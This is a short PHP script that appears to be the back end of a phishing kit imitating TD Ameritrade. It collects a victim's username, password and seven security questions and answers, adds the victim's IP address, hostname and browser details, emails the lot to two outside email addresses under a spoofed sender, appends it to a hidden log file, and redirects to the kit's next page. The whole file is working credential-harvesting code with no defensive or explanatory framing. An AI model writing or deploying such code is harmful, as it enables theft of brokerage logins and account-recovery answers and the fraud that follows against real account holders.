<?php

session_start();

$ip = getenv("REMOTE_ADDR");$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);

$message  = "========+[ TD Ameritrade Complete ]+=========\n";
$UserID   = $_SESSION['userid']."\n";
$Password   = $_SESSION['password']."\n";
$message .= "Username : ".$_SESSION['userid']."\n";
$message .= "Password : ".$_SESSION['password']."\n";
$message .= "Question 1 : ".$_POST['q1']."\n";
$message .= "Answer 1 : ".$_POST['ans1']."\n";
$message .= "Question 2 : ".$_POST['q2']."\n";
$message .= "Answer 2 : ".$_POST['ans2']."\n";
$message .= "Question 3 : ".$_POST['q3']."\n";
$message .= "Answer 3 : ".$_POST['ans3']."\n";
$message .= "Question 4 : ".$_POST['q4']."\n";
$message .= "Answer 4 : ".$_POST['ans4']."\n";
$message .= "Question 5 : ".$_POST['q5']."\n";
$message .= "Answer 5 : ".$_POST['ans5']."\n";
$message .= "Question 6 : ".$_POST['q6']."\n";
$message .= "Answer 6 : ".$_POST['ans6']."\n";
$message .= "Question 7 : ".$_POST['q7']."\n";
$message .= "Answer 7 : ".$_POST['ans7']."\n";
$message .= "==----++++++++++----==\n";
$message .= "IP: ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "Date And Time : ".$date."\n";
$message .= "Browser Details : ".$user_agent."\n";
$send = "donaldgloria93@gmail.com, presidentson090@yandex.com";
$subject = "TD Ameritrade Complete | $ip";
$headers = "From: TDAMER  <legit@mrmoz.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
$fp = fopen('XXXaxmexXXX00SREZUxxxsassssssilkklllllxSDSSSVSSS.txt', 'a');
fwrite($fp, $message);
fclose($fp);
header("Location: email.php");
?>
